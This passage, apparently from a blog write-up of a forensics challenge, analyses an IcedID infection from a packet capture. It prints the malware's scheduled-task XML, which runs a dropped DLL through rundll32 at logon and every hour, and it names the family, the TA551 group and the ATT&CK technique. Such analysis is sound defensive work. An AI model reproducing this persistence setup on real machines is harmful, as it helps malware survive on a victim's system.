+      <span style="color:#f92672">&lt;Repetition&gt;</span>
+        <span style="color:#f92672">&lt;Interval&gt;</span>PT1H<span style="color:#f92672">&lt;/Interval&gt;</span>
+        <span style="color:#f92672">&lt;StopAtDurationEnd&gt;</span>false<span style="color:#f92672">&lt;/StopAtDurationEnd&gt;</span>
+      <span style="color:#f92672">&lt;/Repetition&gt;</span>
+      <span style="color:#f92672">&lt;StartBoundary&gt;</span>2012-01-01T12:00:00<span style="color:#f92672">&lt;/StartBoundary&gt;</span>
+      <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
+    <span style="color:#f92672">&lt;/TimeTrigger&gt;</span>
+    <span style="color:#f92672">&lt;LogonTrigger</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;LogonTrigger&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
+      <span style="color:#f92672">&lt;UserId&gt;</span>user1<span style="color:#f92672">&lt;/UserId&gt;</span>
+    <span style="color:#f92672">&lt;/LogonTrigger&gt;</span>
+  <span style="color:#f92672">&lt;/Triggers&gt;</span>
+  <span style="color:#f92672">&lt;Settings&gt;</span>
+    <span style="color:#f92672">&lt;MultipleInstancesPolicy&gt;</span>IgnoreNew<span style="color:#f92672">&lt;/MultipleInstancesPolicy&gt;</span>
+    <span style="color:#f92672">&lt;DisallowStartIfOnBatteries&gt;</span>false<span style="color:#f92672">&lt;/DisallowStartIfOnBatteries&gt;</span>
+    <span style="color:#f92672">&lt;StopIfGoingOnBatteries&gt;</span>false<span style="color:#f92672">&lt;/StopIfGoingOnBatteries&gt;</span>
+    <span style="color:#f92672">&lt;AllowHardTerminate&gt;</span>false<span style="color:#f92672">&lt;/AllowHardTerminate&gt;</span>
+    <span style="color:#f92672">&lt;StartWhenAvailable&gt;</span>true<span style="color:#f92672">&lt;/StartWhenAvailable&gt;</span>
+    <span style="color:#f92672">&lt;RunOnlyIfNetworkAvailable&gt;</span>false<span style="color:#f92672">&lt;/RunOnlyIfNetworkAvailable&gt;</span>
+    <span style="color:#f92672">&lt;IdleSettings&gt;</span>
+      <span style="color:#f92672">&lt;Duration&gt;</span>PT10M<span style="color:#f92672">&lt;/Duration&gt;</span>
+      <span style="color:#f92672">&lt;WaitTimeout&gt;</span>PT1H<span style="color:#f92672">&lt;/WaitTimeout&gt;</span>
+      <span style="color:#f92672">&lt;StopOnIdleEnd&gt;</span>true<span style="color:#f92672">&lt;/StopOnIdleEnd&gt;</span>
+      <span style="color:#f92672">&lt;RestartOnIdle&gt;</span>false<span style="color:#f92672">&lt;/RestartOnIdle&gt;</span>
+    <span style="color:#f92672">&lt;/IdleSettings&gt;</span>
+    <span style="color:#f92672">&lt;AllowStartOnDemand&gt;</span>true<span style="color:#f92672">&lt;/AllowStartOnDemand&gt;</span>
+    <span style="color:#f92672">&lt;Enabled&gt;</span>true<span style="color:#f92672">&lt;/Enabled&gt;</span>
+    <span style="color:#f92672">&lt;Hidden&gt;</span>false<span style="color:#f92672">&lt;/Hidden&gt;</span>
+    <span style="color:#f92672">&lt;RunOnlyIfIdle&gt;</span>false<span style="color:#f92672">&lt;/RunOnlyIfIdle&gt;</span>
+    <span style="color:#f92672">&lt;WakeToRun&gt;</span>false<span style="color:#f92672">&lt;/WakeToRun&gt;</span>
+    <span style="color:#f92672">&lt;ExecutionTimeLimit&gt;</span>PT0S<span style="color:#f92672">&lt;/ExecutionTimeLimit&gt;</span>
+    <span style="color:#f92672">&lt;Priority&gt;</span>7<span style="color:#f92672">&lt;/Priority&gt;</span>
+  <span style="color:#f92672">&lt;/Settings&gt;</span>
+  <span style="color:#f92672">&lt;Actions</span> <span style="color:#a6e22e">Context=</span><span style="color:#e6db74">&#34;Author&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;Exec&gt;</span>
+      <span style="color:#f92672">&lt;Command&gt;</span>rundll32.exe<span style="color:#f92672">&lt;/Command&gt;</span>
+      <span style="color:#f92672">&lt;Arguments&gt;</span>&#34;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&#34;,update /i:&#34;ComicFantasy\license.dat&#34;<span style="color:#f92672">&lt;/Arguments&gt;</span>
+    <span style="color:#f92672">&lt;/Exec&gt;</span>
+  <span style="color:#f92672">&lt;/Actions&gt;</span>
+  <span style="color:#f92672">&lt;Principals&gt;</span>
+    <span style="color:#f92672">&lt;Principal</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;Author&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;UserId&gt;</span>LAPTOP-SH63S8O\user1<span style="color:#f92672">&lt;/UserId&gt;</span>
+      <span style="color:#f92672">&lt;LogonType&gt;</span>InteractiveToken<span style="color:#f92672">&lt;/LogonType&gt;</span>
+      <span style="color:#f92672">&lt;RunLevel&gt;</span>LeastPrivilege<span style="color:#f92672">&lt;/RunLevel&gt;</span>
+    <span style="color:#f92672">&lt;/Principal&gt;</span>
+  <span style="color:#f92672">&lt;/Principals&gt;</span>
+<span style="color:#f92672">&lt;/Task&gt;</span>
+</code></pre></div><p>This is an XML configuration file for a scheduled task, the <code>&lt;Exec&gt;</code> portion is what we should focus on:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;Exec&gt;</span>
+      <span style="color:#f92672">&lt;Command&gt;</span>rundll32.exe<span style="color:#f92672">&lt;/Command&gt;</span>
+      <span style="color:#f92672">&lt;Arguments&gt;</span>&#34;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&#34;,update /i:&#34;ComicFantasy\license.dat&#34;<span style="color:#f92672">&lt;/Arguments&gt;</span>
+    <span style="color:#f92672">&lt;/Exec&gt;</span>
+</code></pre></div><p>This will set a scheduled task which will run <code>rundll32.exe &quot;C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll&quot;,update /i:&quot;ComicFantasy\license.dat&quot;</code>. But our question is only interested in the arguments supplied to the executed command.</p>
+<ol start="13">
+<li>With OSINT, what is the malware family name used in this PCAP capture?</li>
+</ol>
+<p><code>IcedID</code></p>
+<p>This can be determined by taking an MD5 hash of the files (<code>.doc</code>, <code>.dll</code>, <code>.hta</code>) &amp; searching them on VirusTotal:</p>
+<p><img src="https://i.imgur.com/xt9cDf5.png" alt=""></p>
+<p><img src="https://i.imgur.com/lLW26oR.png" alt=""></p>
+<p><img src="https://i.imgur.com/yGD5eNA.png" alt=""></p>
+<p>The general consensus of VirusTotal is that this malware belongs to the IcedID family. This can be further confirmed by the challenge name.</p>
+<ol start="14">
+<li>Based on Palo Alto Unit 42, what is the APT Group name?</li>
+</ol>
+<p><code>TA551</code></p>
+<p>This can be found by simply searching &ldquo;Palo Alto Unit 42 IcedID Malware&rdquo; on your favorite search engine!</p>
+<ol start="15">
+<li>What is the Mitre Attack code for the initial access in this campaign?</li>
+</ol>
+<p><code>T1566.001</code></p>
+<p>Since we have the APT group name, <code>TA551</code>, we can search Mitre&rsquo;s ATT&amp;CK database which holds information regarding known threats and their tactics and techniques.</p>
+<p>Then we&rsquo;ll be presented with a table of the techniques employed by this group, then we have to find the one which matches up. According to the Palo Alto article, this infection begins wwith a malicious email which contains an attachment:</p>
+<p><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2021/01/word-image-15.jpeg" alt=""></p>
+<p>And if we scroll through the techniques employed by TA551, we see <em>Phishing: Spearphishing Attachment</em> which has an ID of T1566.001:</p>
+<p><img src="https://i.imgur.com/vEySoMA.png" alt=""></p>
+<p><em>NOTE: The description doesn&rsquo;t fit exactly with what we&rsquo;ve analyzed</em></p>
+<h2 id="references">
+  References
+  <a href="#references" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<ul>
+<li><a href="https://github.com/decalage2/oletools/wiki/olevba">https://github.com/decalage2/oletools/wiki/olevba</a></li>
+<li><a href="https://attack.mitre.org/software/S0483/">https://attack.mitre.org/software/S0483/</a></li>
+<li><a href="https://www.virustotal.com/gui/file/3ed5d0476d1ce4fd325666072983d295609fe94c5b65d5db47a53f462ac7a4dc">https://www.virustotal.com/gui/file/3ed5d0476d1ce4fd325666072983d295609fe94c5b65d5db47a53f462ac7a4dc</a></li>
+<li><a href="https://www.virustotal.com/gui/file/cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1/behavior/C2AE">https://www.virustotal.com/gui/file/cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1/behavior/C2AE</a></li>
+<li><a href="https://www.virustotal.com/gui/url/09023b31dcd25e698084fed4f683430d250bf473a1d717ba459a4cb68932c5df/detection">https://www.virustotal.com/gui/url/09023b31dcd25e698084fed4f683430d250bf473a1d717ba459a4cb68932c5df/detection</a></li>
+<li><a href="https://www.virustotal.com/gui/file/51658887e46c88ed6d5861861a55c989d256a7962fb848fe833096ed6b049441/detection">https://www.virustotal.com/gui/file/51658887e46c88ed6d5861861a55c989d256a7962fb848fe833096ed6b049441/detection</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/ta551-shathak-icedid/">https://unit42.paloaltonetworks.com/ta551-shathak-icedid/</a></li>
+</ul>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
